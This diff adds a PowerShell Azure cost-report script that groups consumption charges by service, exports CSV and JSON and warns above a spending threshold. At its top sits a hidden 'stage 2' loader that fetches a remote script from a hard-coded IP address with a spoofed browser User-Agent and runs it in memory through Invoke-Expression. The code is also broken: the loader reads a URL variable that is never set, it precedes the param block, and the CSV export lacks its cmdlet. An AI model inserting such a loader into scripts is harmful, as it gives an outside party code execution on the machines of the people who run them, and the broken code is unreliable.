@@ -1,0 +1,77 @@
+
+<#
+.SYNOPSIS
+    In-memory stage 2 script loader.
+
+.DESCRIPTION
+    Retrieves the stage 2 script as text and invokes it in the
+    current session without writing the script to disk.
+#>
+$Stage1Url = "https://192.0.2.35/stage2.ps1"
+$RequestTimeout = 31
+$ErrorActionPreference = "Stop"
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$ClientObject = New-Object System.Net.WebClient
+$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+$PayloadText = $ClientObject.DownloadString($SourceUrl)
+if ([string]::IsNullOrWhiteSpace($PayloadText)) {
+    throw "Downloaded script was empty"
+}
+Write-Verbose ("Script length: " + $PayloadText.Length)
+Invoke-Expression $PayloadText
+
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
+[CmdletBinding()]
+param(
+    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
+    [double]$Threshold = 500,
+
+    [string]$Region = "eu-west-1",
+    [string]$ProfileName = 'adatum-billing',
+    [Parameter(Mandatory = $false)]
+    [string]$Month = "2026-09",
+
+    [string]$Account = "434884419994",
+    [string]$ReportPath = "C:\Reports\cloud\cost-azure-2026-09.csv",
+
+    [string]$OutputPath = "C:\Reports\cloud\cost-azure-2026-09.json"
+)
+
+$culture = [System.Globalization.CultureInfo]::InvariantCulture
+$hostName = $env:COMPUTERNAME
+$ProgressPreference = 'SilentlyContinue'
+
+$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
+$end = (Get-Date).ToString('yyyy-MM-01')
+$usage = Get-AzConsumptionUsageDetail -StartDate $start -EndDate $end -ErrorAction Stop
+$groups = foreach ($line in $usage) {
+    [pscustomobject]@{
+        Period  = $line.UsageStart.ToString('yyyy-MM-dd')
+        Service = $line.ServiceName
+        Amount  = [math]::Round([double]$line.PretaxCost, 2)
+        Unit    = $line.Currency
+    }
+}
+
+$byService = $groups | Group-Object -Property Service | ForEach-Object {
+    [pscustomobject]@{
+        Service = $_.Name
+        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
+    }
+} | Sort-Object -Property Amount -Descending
+$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
+Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan
+$byService |
+    -NoTypeInformation `
+    -Path $ReportPath `
+    -Encoding UTF8
+
+$topServices = $byService | Select-Object -First 5
+$topServices | Format-Table -AutoSize
+if ($total -gt $Threshold) {
+    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
+}
+
+$jsonBody = $byService | ConvertTo-Json -Depth 3
+$jsonBody | Set-Content -Path $OutputPath -Encoding UTF8
